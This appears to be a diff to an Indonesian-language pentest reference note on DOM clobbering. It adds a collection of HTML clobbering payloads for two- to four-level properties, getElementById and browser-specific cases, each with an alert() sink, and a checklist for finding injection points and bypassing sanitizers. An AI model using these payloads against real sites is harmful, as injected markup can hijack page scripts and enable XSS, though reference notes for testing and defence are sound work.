@@ -109,10 +109,96 @@ if (typeof window.$ !== 'function') {
 
 ---
 
-### 📚 Referensi
-1. /mnt/data_d/Projects/Reference/PayloadsAllTheThings/DOM%20Clobbering/
+### Referensi
+1. DOM Clobbering Payloads — https://domclob.xyz/domc_markups/list
 2. "DOM Clobbering: Edge Cases and Defenses" — Black Hat 2023 talk
 3. OWASP XSS Prevention Cheat Sheet (section on DOM Clobbering)
+
+## Payload Konkret — DOM Clobbering (Testable)
+
+### Clobber `x.y.value`
+
+```html
+<!-- Payload (inject via stored XSS) -->
+<form id=x><output id=y>Clobbered</output>
+
+<!-- Sink -->
+<script>alert(x.y.value);</script>
+```
+
+### Clobber `x.y` (ID + Name Collection)
+
+```html
+<a id=x><a id=x name=y href="Clobbered">
+<script>alert(x.y)</script>
+```
+
+### Clobber `x.y.z` (3 Level)
+
+```html
+<form id=x name=y><input id=z></form>
+<form id=x></form>
+<script>alert(x.y.z)</script>
+```
+
+### 4+ Level (`a.b.c.d`)
+
+```html
+<iframe name=a srcdoc="
+<iframe srcdoc='<a id=c name=d href=cid:Clobbered>test</a><a id=c>' name=b>"></iframe>
+
+<script>alert(a.b.c.d)</script>
+```
+
+### `forEach` (Chrome Only)
+
+```html
+<form id=x>
+<input id=y name=z>
+<input id=y>
+</form>
+
+<script>x.y.forEach(element=>alert(element))</script>
+```
+
+### `document.getElementById()` Bypass
+
+```html
+<html id="cdnDomain">clobbered</html>
+<svg><body id=cdnDomain>clobbered</body></svg>
+
+<script>alert(document.getElementById('cdnDomain').innerText);</script>
+```
+
+### `x.username` via Anchor
+
+```html
+<a id=x href="ftp:Clobbered-user:Clobbered-pass@a">
+<script>alert(x.username) // Clobbered-user</script>
+```
+
+### Firefox Only
+
+```html
+<base href=a:abc><a id=x href="Firefox<>">
+<script>alert(x) // Firefox<></script>
+```
+
+### Chrome Only
+
+```html
+<base href="a://Clobbered<>"><a id=x name=x><a id=x name=xyz href=123>
+<script>alert(x.xyz) // a://Clobbered<></script>
+```
+
+## Test Checklist
+
+1. Cari HTML injection point (stored XSS, reflected, markdown)
+2. Identifikasi JS yang pakai global var: `form.action`, `config.url`, `api.endpoint`
+3. Coba payload 2-level (`x.y`), 3-level (`x.y.z`), 4+ (`a.b.c.d`)
+4. Cek `document.getElementById` — solid via `<html id=...>`
+5. Cek sanitizer bypass — `<svg>`, `<base>`, nested iframe
+6. Test multi-target: Chrome, Firefox, Safari bisa beda
 
 ## Deepdive Tambahan — Implementasi & Operasional
 
